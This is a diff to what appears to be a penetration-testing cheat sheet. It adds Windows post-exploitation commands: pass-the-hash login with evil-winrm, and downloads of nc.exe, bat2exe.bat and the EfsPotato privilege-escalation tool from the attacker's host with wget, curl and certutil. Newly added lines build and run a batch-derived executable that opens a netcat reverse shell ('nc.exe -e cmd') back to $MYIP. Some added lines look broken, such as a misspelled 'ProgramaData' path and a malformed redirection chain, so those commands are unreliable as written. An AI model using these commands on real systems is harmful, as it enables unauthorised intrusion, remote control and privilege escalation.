@@ -837,7 +837,8 @@ evil-winrm -i "$TARGET" -u '$USERNAME' -H '$HASH'
 python3 -m http.server 8888 -d ~/Upload
 
 ## Transfer Tools to a Proxy Box
-scp -C -r ~/Upload user@proxybox:/ ; ssh user@proxybox; python3 -m http.server 8888 -d /Upload
+scp -C -r /Upload user@proxybox:/ ; ssh user@proxybox; python3 -m http.server 8888 -d /Upload
+
 
 ## Linux
 [*] File Transfer
@@ -959,8 +960,13 @@ jp32.exe
 
 +---------- To Disk ----------+
 wget http://$MYIP:8888/windows/nc.exe -o \programdata\nc.exe
+wget http://$MYIP:8888/windows/bat2exe.bat -o \programdata\bat2exe.bat
+wget http://$MYIP:8888/windows/EfsPotato.exe -o \programdata\EfsPotato.exe
+curl http://$MYIP:8888/windows/nc.exe -o \programdata\nc.exe
+curl http://$MYIP:8888/windows/bat2exe.bat -o \programdata\bat2exe.bat
 curl http://$MYIP:8888/windows/EfsPotato.exe -o \programdata\EfsPotato.exe
 certutil -urlcache -f http://$MYIP:8888/windows/nc.exe \programdata\nc.exe
+certutil -urlcache -f http://$MYIP:8888/windows/bat2exe.bat \programdata\bat2exe.bat
 certutil -urlcache -f http://$MYIP:8888/windows/EfsPotato.exe \programdata\EfsPotato.exe
 
 [*] Privilege Escalation
@@ -983,7 +989,9 @@ powershell -c "Start-ScheduledTask -TaskName 'Ownership'"
 
 +---------- Shell From File ----------+
 rlwrap nc -lvnp 5555
-C:\programdata\nc.exe $MYIP 5555 -e cmd.exe
+cmd /c "(echo @echo off & echo C:\ProgramaData\nc.exe -e cmd %MYIP% 5555 & echo PAUSE & echo exit) > x.bat"
+bat2exe.bat > x.bat > x.exe > C:\programdata\x.exe
+C:\programdata\x.exe
 
 +---------- Shell From Memory ----------+
 rlwrap nc -lvnp 5555
